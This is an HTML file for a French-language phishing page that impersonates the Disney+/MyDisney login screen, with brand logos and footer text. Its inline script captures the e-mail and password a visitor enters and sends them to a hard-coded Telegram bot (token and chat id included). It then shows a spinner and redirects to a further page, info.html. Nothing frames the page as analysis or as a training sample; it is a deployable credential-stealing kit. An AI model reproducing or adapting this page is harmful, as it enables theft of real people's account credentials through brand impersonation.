<!-- login.html -->
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Se connecter | Disney+</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body class="page-form">
  <main>
    <!-- Logo MyDisney -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>Connexion</h1>
    <p>Entrez votre adresse e-mail et votre mot de passe pour continuer.</p>

    <form id="loginForm">
      <input type="email" placeholder="Adresse e-mail" required/>
      <input type="password" placeholder="Mot de passe" required/>
      <button type="submit">Se connecter</button>
    </form>

    <!-- Note et logos partenaires -->
    <div class="footer-note">
      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
      MyDisney vous donne acc√®s aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const email = this.querySelector('input[type="email"]').value.trim();
      const pwd   = this.querySelector('input[type="password"]').value.trim();
      const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chat  = "-4970333928";
      const msg   = `üîê Connexion Disney+ :\nUtilisateur : ${email}\nMot de passe : ${pwd}`;

      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat, text: msg })
      }).catch(console.error)
        .finally(() => setTimeout(() => location.href = "info.html", 2500));
    });
  </script>
</body>
</html>
